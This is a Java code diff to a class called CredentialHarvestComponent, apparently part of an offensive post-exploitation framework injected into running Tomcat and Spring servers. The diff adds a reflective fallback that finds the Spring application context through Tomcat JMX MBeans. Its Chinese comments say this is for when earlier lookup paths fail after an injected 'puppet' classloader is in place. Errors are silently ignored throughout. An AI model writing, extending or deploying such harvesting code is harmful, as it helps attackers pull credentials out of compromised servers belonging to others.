@@ -4,6 +4,7 @@ import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.HashMap;
+import java.util.HashSet;
 import java.util.Iterator;
 import java.util.Map;
 import java.util.Properties;
@@ -454,7 +455,16 @@ public class CredentialHarvestComponent implements Runnable {
     // ==================== 工具方法 ====================
 
     /**
-     * 获取 Spring ApplicationContext（复用 SpringFrameworkManageComponent 的逻辑）
+     * 获取 Spring ApplicationContext。
+     *
+     * <p>四条路径降级，确保 idle Spring Boot 部署 / puppet 注入全局 CL 等场景都能拿到 context：
+     * <ol>
+     *   <li>RequestContextHolder（请求线程才有效）</li>
+     *   <li>LiveBeansView.applicationContexts（Spring 5.x 静态字段，6+ 移除）</li>
+     *   <li>SpringApplication.context 静态字段（Spring Boot 主入口）</li>
+     *   <li><b>Tomcat MBean 兜底</b>：查 {@code Catalina:j2eeType=WebModule,*} 拿到 StandardContext，
+     *       走 {@code getServletContext()} → {@code WebApplicationContextUtils.getWebApplicationContext()}</li>
+     * </ol>
      */
     private Object getSpringContext() {
         ClassLoader cl = Thread.currentThread().getContextClassLoader();
@@ -505,7 +515,92 @@ public class CredentialHarvestComponent implements Runnable {
         } catch (Exception ignored) {
         }
 
+        // 方式4（兜底）：通过 Tomcat JMX MBean 反推
+        // 解决 idle Tomcat 部署 + puppet 注入全局 CL 时前三条路径全失效
+        try {
+            Object ctx = getSpringContextFromTomcat(cl);
+            if (ctx != null) return ctx;
+        } catch (Throwable ignored) {
+        }
+
         return null;
+    }
+
+    /**
+     * 通过 Tomcat 反推 Spring WebApplicationContext。
+     * 优先复用同进程内已加载的 TomcatCatalinaManageComponent.getContext()，
+     * 不可用时自己走 PlatformMBeanServer 查 Catalina:j2eeType=WebModule,*。
+     */
+    private static Object getSpringContextFromTomcat(ClassLoader cl) throws Throwable {
+        HashSet standardContexts = null;
+        try {
+            Class tomcatComp = cl.loadClass("org.leo.core.component.TomcatCatalinaManageComponent");
+            Method getCtx = tomcatComp.getDeclaredMethod("getContext");
+            getCtx.setAccessible(true);
+            standardContexts = (HashSet) getCtx.invoke(null);
+        } catch (Throwable ignored) {
+            // 退化到自己走 MBean
+            standardContexts = queryTomcatContexts();
+        }
+        if (standardContexts == null || standardContexts.isEmpty()) return null;
+
+        // 从 ServletContext 走 WebApplicationContextUtils.getWebApplicationContext()
+        Class waCtxUtils = cl.loadClass("org.springframework.web.context.support.WebApplicationContextUtils");
+        // 优先 javax.servlet 签名（Tomcat 9 及之前 / Spring 5.x），失败试 jakarta.servlet（Tomcat 10+ / Spring 6+）
+        Method getViaJavax = null;
+        Method getViaJakarta = null;
+        try {
+            getViaJavax = waCtxUtils.getMethod("getWebApplicationContext", cl.loadClass("javax.servlet.ServletContext"));
+        } catch (Throwable ignored) {
+        }
+        try {
+            getViaJakarta = waCtxUtils.getMethod("getWebApplicationContext", cl.loadClass("jakarta.servlet.ServletContext"));
+        } catch (Throwable ignored) {
+        }
+
+        Iterator iter = standardContexts.iterator();
+        while (iter.hasNext()) {
+            Object stdCtx = iter.next();
+            try {
+                Method getServletCtx = stdCtx.getClass().getMethod("getServletContext");
+                Object servletCtx = getServletCtx.invoke(stdCtx);
+                if (servletCtx == null) continue;
+                Object waCtx = null;
+                if (getViaJavax != null) {
+                    try { waCtx = getViaJavax.invoke(null, servletCtx); } catch (Throwable ignored) {}
+                }
+                if (waCtx == null && getViaJakarta != null) {
+                    try { waCtx = getViaJakarta.invoke(null, servletCtx); } catch (Throwable ignored) {}
+                }
+                if (waCtx != null) return waCtx;
+            } catch (Throwable ignored) {
+                // 这个 context 不是 Spring 应用，跳过
+            }
+        }
+        return null;
+    }
+
+    /** 自己查 Tomcat WebModule MBean 拿 StandardContext。 */
+    private static HashSet queryTomcatContexts() throws Throwable {
+        HashSet ctxs = new HashSet();
+        Class mfClass = Class.forName("java.lang.management.ManagementFactory");
+        Object mbs = mfClass.getMethod("getPlatformMBeanServer").invoke(null);
+        Class onClass = Class.forName("javax.management.ObjectName");
+        Object pattern = onClass.getConstructor(String.class).newInstance("Catalina:j2eeType=WebModule,*");
+        Method queryNames = mbs.getClass().getMethod("queryNames", onClass, Class.forName("javax.management.QueryExp"));
+        Set names = (Set) queryNames.invoke(mbs, pattern, null);
+        if (names == null) return ctxs;
+        Method getAttribute = mbs.getClass().getMethod("getAttribute", onClass, String.class);
+        Iterator iter = names.iterator();
+        while (iter.hasNext()) {
+            try {
+                Object on = iter.next();
+                Object ctx = getAttribute.invoke(mbs, on, "managedResource");
+                if (ctx != null) ctxs.add(ctx);
+            } catch (Throwable ignored) {
+            }
+        }
+        return ctxs;
     }
 
     /**
